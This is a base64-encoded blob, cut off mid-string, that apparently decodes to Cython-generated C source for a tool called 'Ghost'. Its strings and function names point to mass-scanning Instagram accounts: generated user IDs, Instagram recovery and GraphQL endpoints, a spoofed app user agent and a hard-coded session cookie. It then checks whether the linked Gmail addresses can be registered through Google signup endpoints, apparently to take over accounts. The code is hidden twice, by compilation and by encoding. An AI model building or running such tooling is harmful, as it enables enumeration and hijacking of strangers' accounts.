IxJFwyNDBBXDM0MFwwMTRcclwzMzBcMDIwXDAzMFwyMzBcMDA1XDIzMFFcMzMwXDAyNFwwMjZcMzIwXDAyNjZcMjYwZFwzMjA6TVwzMTBVXDMyMFJbXDMyMFtjXDMyMGNkXDMzMFwwMTRcMDIzXDIyMD1cMjQwXDAwMVwzMzBcMDIwXDAyNVwyMjBRXDIyMGFcMzMwXDAxMFwwMTdcMjEwfVwyMzBBXDMzMFwwMTRcMDIxXDIyMFwwMjFcMjIwISI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQV9hcV9kXzFfM2F2WFFlMV9mRzFfUV9RZkhBVV80dlhbXSA9ICJcMjAwQVwzMzBcMDEwXDAxNFwzMjBcMDE0XDAzNlwyMzBhXDIzMHFcMzMwXDAxMFx0XDMzMFwwMTRcMDI2XDIyMGRcMzIwXDAzMitcMjUwMVwzMzBcMDE0XDAzM1wyMzAzXDIzMGFcMjMwdlwyNDBYXDI1MFFcMjUwZVwyNjAxXDMzMFwwMTRcMDM2XDIzMGZcMjQwR1wyNTAxXDMzMFwwMjBcMDIxXDIyMFwwMzJcMjMwOlwyNDBcXFwyNjBcMDMyXDI3MDpcMzAwUVwzMzBcMDE0XDAyMlwyMjAjXDIyMFFcMjIwZlwyMzBIXDI0MEFcMjQwVVwyNTAhXDMzMFwwMTRcMDMxXDIzMFwwMjJcMjMwNFwyMzB2XDI0MFhcMjUwUVwyNTBlXDI2MDhcMjcwNlwzMDBcMDMwXDMxMFwwMjFcMzEwJVwzMTBxXDMzMFwwMTRcMDI0XDIyMEZcMjMwJ1wyNDBcMDIxXDI0MCFcMjQwO1wyNTBqXDI3MFwwMTNcMzAwN1wzMTAhXDMzMFwiKVwyNTBcMDMzXDI2MEpcMjcwaFwzMDBoXDMxMGhcMzIwVldcMzMwXDAxNFwwMzNcMjMwM1wyMzBhXDIzMHZcMjQwWFwyNTBRXDI1MGVcMjYwMVwzMzBcMDE0XDAzMVwyMzBcMDIyXDMyMFwwMzNBXDMyMEFUXDMyMFReXDMyMF5sXDMyMGx5XDM2MFwwMDBcMDAwelwwMDFOXDAwMlwzNjBcMDAwXDAwME5cMDAycVwwMDJcMzYwXDAwMFwwMDBxXDAwMnJcMDAyXDMzMFwwMTRcMDMwXDIzMFwwMDJcMjMwJVwyMzBxXDI0MFwwMDZcMjQwaFwyNTBhXDMzMFwwMjBcMDI2XDIyMG9cMjQwUlwyNDB2XDI1MFlcMjYwYlwyNzBcMDAxXDMzMFwwMTRcclwzMzBcMDIwXDAzMlwyMzAhXDMzMFwwMjAjXDI0MDFcMzMwXDAyMCBcMjQwXDAwMVwzMzBcMDIwXDAyN1wyMjBxXDMzMFwwMjBcMDMyXDIzMCFcMzMwXDAyMFwwMzRcMjMwQVwzMzBcMDIwXDAzM1wyMzAxXDMzMFwwMjBcMDM2XDIzMGFcMzMwXDAyMCZcMjQwYVwzMzBcMDIwXDAzNFwyMzBBXDM0MFwwMTRcclwzMzBcMDIwXDAyN1wyMjBxXDMzMFwwMjAnXDI0MHFcMzMwXDAyMCxcMjUwQVwzMzBcMDIwXDAzNVwyMzBUXDI0MFwwMjZcMjQwclwyNTBcMDMyXDI2MDlcMjcwTFwzMTBcMDAxXDMzMFwwMjAlXDI0MFFcMzMwXDAyMFwwMzJcMjMwIVwzNDBcMDE0XDAyN1wyMjB4XDIzMHVcMjQwQVwzMzBcMDIwOVwyNzBcMDMwXDMwMFwwMzFcMzEwJVwzMTB2XDMyMFVdXDMyMF1eXDMzMFwwMTRcMDMwXDIzMFwwMTBcMjQwXDAwNVwyNDBSXDI0MHRcMjUwMVwyNTBIXDI2MENcMjYwdFwyNzAxXDI3MEhcMzAwQVwzMzBcMDE0XDAyN1wyMjB5XDI0MFwwMDRcMjQwQVwyNDBcXFwyNjBcMDIxXDM0MFwwMTRcMDE3XDIxMHFcMzMwXDAyMFwwMjRcMjIwSlwyMzBhXDIzMHxcMjUwMVwzMzBcMDIwIVwyNDBcMDIzXDI0MEFcMjQwWVwyNTBkXDI2MCFcMzIwM0VcMzAwUVwzMzBcMDIwXDAzNlwyMzBjXDI0MFwwMjFcMjQwKVwyNTA0XDI1MHFcMjYwXDAxN1wyNzBxXDM0MFwwMjBcMDIzXDIyMDRcMjIwd1wyMzBpXDI0MHRcMjUwP1wyNzAjXDI3MFNcMzAwXDAwNFwzMDBMXDMyMFBTXDMyMFNUXDMzMFwwMjRcMDM0XDIzMEJcMjMwZFwyNDAhXDMzMFwwMjRcMDMwXDIzMFwwMDZcMjMwYVwyMzBxXDM0MFwwMTBcMDE3XDIxMH1cMjMwQSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfR2hvc3RfYWR2YW5jZWRfc2Nhbm5lcl9sb2NhbHNfZ2VbXSA9ICJHaG9zdC5hZHZhbmNlZF9zY2FubmVyLjxsb2NhbHM+LmdlbmV4cHIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0luc3RhZ3JhbV8xMDBfMF8wXzE3XzEyOV9BbmRyb2lkW10gPSAiSW5zdGFncmFtIDEwMC4wLjAuMTcuMTI5IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjEyOTsgc2Ftc3VuZzsgU00tTTIwNUY7IG0yMGx0ZTsgZXh5bm9zNzkwNDsgZW5fR0I7IDE2MTQ3ODY2NCkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0luc3RhZ3JhbV8zMTFfMF8wXzMyXzExOF9BbmRyb2lkW10gPSAiSW5zdGFncmFtIDMxMS4wLjAuMzIuMTE4IEFuZHJvaWQgKCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUG9sYXJpc1VzZXJIb3ZlckNhcmRDb250ZW50VjJRdWVbXSA9ICJQb2xhcmlzVXNlckhvdmVyQ2FyZENvbnRlbnRWMlF1ZXJ5IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZVtdID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDtjaGFyc2V0PVVURi04IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MFtdID0gImM4MGM1ZmIzMGRmYWU5ZTI3M2U0MDA5ZjAzYjE4MjgwYmIzNDNiMDg2MmQ2NjNmMzFhM2M2M2YxM2E5ZjMxYzAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NvbnRpbnVlX2h0dHBzXzNBXzJGXzJGbWFpbF9nb29nW10gPSAiY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmZGRtPTAmZmxvd0VudHJ5PVNpZ25VcCZzZXJ2aWNlPW1haWwmdGhlbWU9bW4mZi5yZXE9JTVCJTIyVEwlM0EiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RhdGFfaW5pdGlhbF9zZXR1cF9kYXRhX3F1b3RfcXVvW10gPSAiZGF0YS1pbml0aWFsLXNldHVwLWRhdGE9XCIlLkAuKj8mcXVvdDsoLio/KSZxdW90Oy4qPyZxdW90OyguKj8pJiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ25bXSA9ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20vXy9zaWdudXAvdmFsaWRhdGVwZXJzb25hbGRldGFpbHMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbmluW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ25pbi92Mi91c2VybmFtZXJlY292ZXJ5P2Zsb3dOYW1lPUdsaWZXZWJTaWduSW4mZmxvd0VudHJ5PVNlcnZpY2VMb2dpbiZobD1lbi1HQiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBbXSA9ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20vc2lnbnVwL3YyL2NyZWF0ZWFjY291bnQ/c2VydmljZT1tYWlsJmNvbnRpbnVlPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJnRoZW1lPW1uIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjY1tdID0gImh0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS9hY2NvdW50cy9zZW5kX3JlY292ZXJ5X2Zsb3dfZW1haWwvIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcFtdID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYXBpL2dyYXBocWwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2NyaXN0aWFuW10gPSAiaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9jcmlzdGlhbm8vZm9sbG93aW5nLyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbWlkX1pWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblBbXSA9ICJtaWQ9WlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUDsgY3NyZnRva2VuPTl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8zW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL18vc2lnbnVwL3VzZXJuYW1lYXZhaWxhYmlsaXR5IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cF8yW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGV1c2VybmFtZT9zZXJ2aWNlPW1haWwmY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmVEw9IjsKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF9fX2luaXRfXyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yaW5jcmVtZW50X2NvdW50ZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfa2V5KTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF80c2V0X2FjdGl2ZV90aHJlYWRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2NvdW50KTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF82Z2V0X2NvdW50ZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfa2V5KTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF84Y3JlYXRlX2Jhbm5lcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzN0bGxfZ2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzN0bGxfM2dlbmV4cHIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8zdGxsXzZnZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMTB0bGwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMTJjaGVja19nbWFpbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMTRjaGVjayhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMTZyZXN0KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMThkYXRlKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfSWQpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzIwSW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZyk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMjJnZW5lcmF0ZV91c2VyX2lkKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMjRzY2FubmVyX3dvcmtlcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3dvcmtlcl9pZCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMjZjcmVhdGVfZGFzaGJvYXJkKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzE2YWR2YW5jZWRfc2Nhbm5lcl9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yOGFkdmFuY2VkX3NjYW5uZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMzBydW4oQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyAKCgoKI2lmbmRlZiBDWVRIT05fU01BTExfQ09ERQojaWYgZGVmaW5lZChfX2NsYW5nX18pCiAgICAjZGVmaW5lIENZVEhPTl9TTUFMTF9DT0RFCiNlbGlmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gMykpCiAgICAjZGVmaW5lIENZVEhPTl9TTUFMTF9DT0RFIF9fYXR0cmlidXRlX18oKGNvbGQpKQojZWxzZQogICAgI2RlZmluZSBDWVRIT05fU01BTExfQ09ERQojZW5kaWYKI2VuZGlmCgp0eXBlZGVmIHN0cnVjdCB7CiAgUHlPYmplY3QgKl9fcHl4X2Q7CiAgUHlPYmplY3QgKl9fcHl4X2I7CiAgUHlPYmplY3QgKl9fcHl4X2N5dGhvbl9ydW50aW1lOwogIFB5T2JqZWN0ICpfX3B5eF9lbXB0eV90dXBsZTsKICBQeU9iamVjdCAqX19weXhfZW1wdHlfYnl0ZXM7CiAgUHlPYmplY3QgKl9fcHl4X2VtcHR5X3VuaWNvZGU7CiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfQ3lGdW5jdGlvblR5cGU7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfRnVzZWRGdW5jdGlvblR5cGU7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9HZW5lcmF0b3JUeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9JdGVyYWJsZUNvcm91dGluZV9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9JdGVyYWJsZUNvcm91dGluZVR5cGU7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9Db3JvdXRpbmVBd2FpdFR5cGU7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9Db3JvdXRpbmVUeXBlOwogICNlbmRpZgogIFB5T2JqZWN0ICpfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbDsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbDsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByOwogIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7CiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByOwogIF9fUHl4X0NhY2hlZENGdW5jdGlvbiBfX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcDsKICBQeU9iamVjdCAqX19weXhfc2xpY2VbMV07CiAgUHlPYmplY3QgKl9fcHl4X3R1cGxlWzIzXTsKICBQeU9iamVjdCAqX19weXhfY29kZW9ial90YWJbMjBdOwogIFB5T2JqZWN0ICpfX3B5eF9zdHJpbmdfdGFiWzQ0MF07CiAgUHlPYmplY3QgKl9fcHl4X2ludF8wOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTsKICBQeU9iamVjdCAqX19weXhfaW50XzI7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8zOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNjsKICBQeU9iamVjdCAqX19weXhfaW50Xzk7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xMDsKICBQeU9iamVjdCAqX19weXhfaW50XzE1OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTY7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8zMDsKICBQeU9iamVjdCAqX19weXhfaW50XzMyOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTExOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTUwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfOTk5OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTMwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDEwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxMTsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTI7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDEzOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxNDsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTU7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE2OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxNzsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTg7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE5OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTI3OTAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzEyNzkwMDE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xNzc1MDAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzE3NzUwMDAxOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjc5NzYwMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjc5NzYwMDAxOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfOTAwOTkwMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfOTAwOTkwMDAxOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTYyOTAxMDAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzE5MDAwMDAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yNTAwMDAwMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMzcxMzY2ODc4NjsKICBQeU9iamVjdCAqX19weXhfaW50XzU2OTk3ODUyMTc7CiAgUHlPYmplY3QgKl9fcHl4X2ludF84NTA3OTQwNjM0OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjEyNTQwMjk4MzQ7CgoKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpfX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGxbOF07CmludCBfX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsOwojZW5kaWYKCiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwpzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpfX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcls4XTsKaW50IF9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKI2VuZGlmCgojaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfZnJlZWxpc3RfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbOF07CmludCBfX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7CiNlbmRpZgoKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2ZyZWVsaXN0XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByWzhdOwppbnQgX19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByOwojZW5kaWYKCiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwpzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICpfX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcls4XTsKaW50IF9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcjsKI2VuZGlmCgpQeVR5cGVPYmplY3QgKl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpQeU9iamVjdCAqX19QeXhfQ2FjaGVkTWV0aG9kVHlwZTsKI2VuZGlmCgoKc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSBfX3B5eF9jb2RlX2NhY2hlOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwClB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlOwojZW5kaWYKCgp9IF9fcHl4X21zdGF0ZXR5cGU7CgojaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKI2lmZGVmIF9fY3BsdXNwbHVzCm5